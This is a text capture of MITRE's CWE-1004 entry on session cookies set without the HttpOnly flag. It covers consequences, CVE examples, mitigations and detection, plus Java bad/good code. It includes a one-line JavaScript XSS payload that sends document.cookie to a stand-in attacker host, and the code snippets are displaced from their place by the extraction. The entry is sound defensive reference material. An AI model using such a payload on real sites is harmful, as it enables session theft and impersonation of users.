3/7/24, 2:41 PM CWE - CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag (4.14)
https://cwe.mitre.org/data/deﬁnitions/1004.html 1/3
Common W eakness Enumeration
A community-developed list of SW & HW weaknesses that can become
vulnerabilities
Home Search
CWE-1004: Sensitive Cookie W ithout 'HttpOnly' Flag
Weakness ID: 1004
Vulnerability Mapping: 
View customized information:
 Description
The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.
 Extended Description
The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the
Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code
might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not
reveal the contents of the cookie to a third party via client-side script executed via XSS.
 Relationships
 Relevant to the view "Research Concepts" (CWE-1000)
Nature Type ID Name
ChildOf 732 Incorrect Permission Assignment for Critical Resource
 Background Details
An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser .
This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity , and
for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script
code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be
attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user , and
are instead just supposed to be attached to future requests to verify authentication details.
 Modes Of Introduction
Phase Note
Implementation
 Applicable Platforms
Languages
Class: Not Language-Specific (Undetermined Prevalence)
Technologies
Class: W eb Based (Undetermined Prevalence)
 Common Consequences
Scope Impact Likelihood
ConfidentialityTechnical Impact: Read Application Data
If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to
unintended parties.
IntegrityTechnical Impact: Gain Privileges or Assume Identity
If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an
adversary to steal authentication data (e.g., a session ID) and assume the identity of the user .
 Likelihood Of Exploit
Medium
 Demonstrative Examples
Example 1
In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be
sent to the website with each request made by the client.
The snippet of code below establishes a new cookie to hold the sessionID.About ▼ CWE List ▼ Mapping ▼ Top-N Lists ▼ Community ▼ News ▼
ALLOWED
Abstraction: Variant
Conceptual OperationalMapping
FriendlyComplete Custom
(bad code) Example Language: Java 3/7/24, 2:41 PM CWE - CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag (4.14)
https://cwe.mitre.org/data/deﬁnitions/1004.html 2/3The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:
When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the
request and steal the cookie.
To mitigate the risk, use the setHttpOnly(true) method.
 Observed Examples
Reference Description
CVE-2022-24045 Web application for a room automation system has client-side Javascript that sets a sensitive cookie
without the HTTPOnly security attribute, allowing the cookie to be accessed.
CVE-2014-3852 CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header , allowing remote
attackers to obtain potentially sensitive information via script access to this cookie.
CVE-2015-4138 Appliance for managing encrypted communications does not use HttpOnly flag.
 Potential Mitigations
Phase: Implementation
Leverage the HttpOnly flag when setting a sensitive cookie in a response.
Effectiveness: High
Note: While this mitigation is ef fective for protecting cookies from a browser's own scripting engine, third-party components or
plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to
read the headers directly and obtain the cookie.
 Detection Methods
Automated Static Analysis
Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this
weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically , this is done by building a
model of data flow and control flow , then searching for potentially-vulnerable patterns that connect "sources" (origins of input)
with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)
Effectiveness: High
 Memberships
Nature Type ID Name
MemberOf 1349 OWASP Top Ten 2021 Category A05:2021 - Security Misconfiguration
MemberOf 1396 Comprehensive Categorization: Access Control
 Vulnerability Mapping Notes
Usage: ALLOWED (this CWE ID could be used to map to real-world vulnerabilities)
Reason: Acceptable-Use
Rationale:
This CWE entry is at the V ariant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of
vulnerabilities.
Comments:
Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a
lower-level Base/V ariant simply to comply with this preferred level of abstraction.
 References
[REF-2] OW ASP. "HttpOnly". < https://owasp.org/www-community/HttpOnly >. URL validated: 2023-04-07 .
String sessionID = generateSessionId();
Cookie c = new Cookie("session\_id", sessionID);
response.addCookie(c);
(attack code) Example Language: JavaScript 
document.write('![](http://attacker.example.com/collect-cookies?cookie=' + document.cookie . ')'
(good code) Example Language: Java 
String sessionID = generateSessionId();
Cookie c = new Cookie("session\_id", sessionID);
c.setHttpOnly(true);
response.addCookie(c);3/7/24, 2:41 PM CWE - CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag (4.14)
https://cwe.mitre.org/data/deﬁnitions/1004.html 3/3[REF-3] Michael Howard. "Some Bad News and Some Good News". 2002. < https://learn.microsoft.com/en-us/previous-
versions/ms972826(v=msdn.10)?redirectedfrom=MSDN >. URL validated: 2023-04-07 .
[REF-4] Troy Hunt. "C is for cookie, H is for hacker - understanding HTTP only and Secure cookies". 2013-03-26.
.
[REF-5] Microsoft. "Mitigating Cross-site Scripting With HTTP-only Cookies". < https://learn.microsoft.com/en-us/previous-
versions//ms533046(v=vs.85)?redirectedfrom=MSDN >. URL validated: 2023-04-07 .
 Content History
 Submissions
Submission Date Submitter Organization
2017-01-02
(CWE 2.10, 2017-01-19)CWE Content Team MITRE
 Modifications